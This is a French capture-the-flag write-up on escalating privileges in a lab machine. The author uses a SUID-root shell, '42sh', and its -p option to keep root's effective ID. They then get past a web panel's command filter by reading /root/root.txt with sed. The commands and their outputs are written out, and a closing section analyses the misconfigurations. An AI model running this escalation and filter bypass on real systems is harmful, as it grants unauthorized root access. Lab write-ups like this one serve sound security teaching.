# H4ck3rz #2 — `root.txt`

## 1. Périmètre et méthodologie

Cette exploitation utilise la même instance que le challenge **H4ck3rz**, relancée le 22 septembre 2026 à l'adresse `10.10.0.18`.

L'objectif était de récupérer le fichier `root.txt`.

### Prérequis

L'accès au **Shell Panel** présenté dans `h4ck3rz.md` est nécessaire pour poursuivre l'exploitation.

### Techniques utilisées

* inspection des permissions et attributs d'un exécutable ;
* exécution de commandes avec un autre utilisateur ;
* exploitation d'un exécutable SUID ;
* conservation de l'UID effectif root via une option du shell ;
* lecture du fichier `root.txt` en contournant les commandes filtrées par le panneau.

### Outils utilisés

* `curl`
* `sudo`
* `stat`
* `42sh`
* `id`
* `sed`

---

## 2. Découverte de l'exécutable SUID

Depuis le Shell Panel, l'environnement de l'utilisateur `titouan` est inspecté :

```bash
sudo -u titouan sh -c 'id; ls -la /home/titouan'
sudo -u titouan stat /home/titouan/42sh
```

Les sorties obtenues sont notamment :

```text
uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)

-rwsrwsrwt 1 root root 1298416 Aug 27 09:35 42sh
```

L'analyse détaillée des permissions confirme la présence du bit **SUID** :

```text
Access: (7777/-rwsrwsrwt)  Uid: (0/root)  Gid: (0/root)
```

L'exécutable `/home/titouan/42sh` appartient donc à `root` et possède le bit SUID.

Cela signifie qu'il peut théoriquement être exécuté avec un **UID effectif root**, sous réserve que le programme conserve effectivement ce privilège lors de son exécution.

---

## 3. Vérification du comportement du SUID

Une première exécution du shell permet de vérifier son comportement par défaut :

```bash
sudo -u titouan /home/titouan/42sh -c 'id'
```

Résultat :

```text
uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)
```

Le shell abandonne donc son privilège effectif root lors de son lancement normal.

Cependant, l'analyse de `42sh` montre que l'option `-p` permet de **préserver les privilèges effectifs**.

Cette hypothèse est vérifiée avec :

```bash
sudo -u titouan /home/titouan/42sh -p -c 'id'
```

Résultat :

```text
uid=1000(titouan) gid=1000(titouan) euid=0(root) egid=0(root) groups=0(root),1000(titouan)
```

La différence est significative :

* `uid=1000(titouan)` : l'identité réelle reste `titouan` ;
* `euid=0(root)` : les commandes exécutées par le shell disposent toutefois des privilèges effectifs de `root`.

L'option `-p` permet donc d'exploiter directement le SUID root de `42sh`.

---

## 4. Lecture du fichier `root.txt`

Le Shell Panel utilisé précédemment applique un filtrage sur certaines commandes, notamment `cat` et `head`.

Il reste néanmoins possible d'utiliser `sed` pour afficher le contenu du fichier.

La commande exécutée dans le champ `command` du panneau est :

```bash
sudo -u titouan /home/titouan/42sh -p -c 'sed -n p /root/root.txt' 2>&1
```

Grâce au SUID de `42sh` et à l'option `-p`, `sed` est exécuté avec les privilèges effectifs de `root`.

La commande retourne alors :

```text
EPI{********}
```

---

## 5. Flag root

```text
EPI{********}
```

---

## 6. Chaîne d'exploitation

L'élévation de privilèges repose sur la chaîne suivante :

```text
Accès au Shell Panel
        ↓
Exécution de commandes en tant que titouan
        ↓
Inspection de /home/titouan/42sh
        ↓
Découverte du SUID root
        ↓
42sh abandonne le privilège en mode normal
        ↓
Option -p pour conserver l'EUID root
        ↓
euid=0(root)
        ↓
Utilisation de sed pour contourner le filtre du panneau
        ↓
Lecture de /root/root.txt
```

## 7. Vulnérabilités identifiées

### Exécutable SUID root

Le fichier `/home/titouan/42sh` est détenu par `root` et possède le bit SUID tout en étant exécutable par `titouan`.

```text
-rwsrwsrwt 1 root root ... 42sh
```

Cette configuration permet à `titouan` de lancer le programme avec un UID effectif root.

### Préservation des privilèges

Le comportement de `42sh` permet de conserver l'UID effectif root avec l'option `-p` :

```text
uid=1000(titouan) ... euid=0(root)
```

L'exécutable devient ainsi un moyen direct d'exécuter des commandes avec les privilèges de `root`.

### Filtrage insuffisant du Shell Panel

Le panneau filtre certaines commandes comme `cat` et `head`, mais ce filtrage est basé sur les commandes utilisées et non sur les permissions réellement disponibles.

L'utilisation de :

```bash
sed -n p /root/root.txt
```

permet donc de lire le fichier malgré le filtrage.

---

## 8. Résumé

La compromission repose principalement sur une mauvaise configuration des permissions de `/home/titouan/42sh`.

Le binaire est **SUID root**, mais son comportement normal abandonne l'UID effectif. L'option `-p` permet cependant de conserver ce privilège :

```bash
/home/titouan/42sh -p
```

Le shell fournit alors un `euid=0(root)`, permettant d'exécuter `sed` avec les privilèges root et de lire directement `/root/root.txt`.

Le flag récupéré est :

```text
EPI{********}
```

Le flag a été lu localement ; sa soumission sur la plateforme du CTF n'a pas été vérifiée.
